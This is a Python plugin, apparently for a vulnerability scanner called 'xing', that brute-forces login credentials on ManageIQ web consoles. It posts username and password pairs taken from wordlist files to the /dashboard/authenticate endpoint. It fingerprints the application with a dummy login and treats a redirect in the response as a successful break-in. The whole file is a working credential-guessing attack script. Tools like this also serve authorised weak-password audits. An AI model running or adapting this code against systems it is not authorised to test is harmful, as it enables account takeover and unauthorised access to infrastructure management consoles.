import base64
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.BRUTE
        self.vul_name = "ManageIQ 弱口令"
        self.app_name = 'ManageIQ'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

        self._check_str = b'Sorry, the username or password you entered is incorrect'
        self.username_file = "username_manageiq.txt"
        self.password_file = "password_manageiq.txt"

    def login(self, target, user, passwd):
        conn = self.login_manageiq(target, user, passwd)
        if self._check_str in conn.content:
            return False

        if b'window.location.href = "/' in conn.content:
            return True

    def check_app(self, target):
        conn = self.login_manageiq(target, "t3st", "n1pass123")

        if self._check_str not in conn.content:
            return False

        if conn.status_code == 200:
            return True
        else:
            return False

    def login_manageiq(self, target, user, passwd) -> str:
        url = target + "/dashboard/authenticate?button=login"
        headers = {
            "Accept-Language": "en-US;q=0.9,en;q=0.8",
            "Referer": target,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }

        data_tpl = "user_name={}&user_password={}&browser_name=Chrome&browser_version=120&browser_os=Windows&user_TZO=8"
        data = data_tpl.format(user, passwd)
        conn = http_req(url, "post", headers=headers, data = data)

        return conn
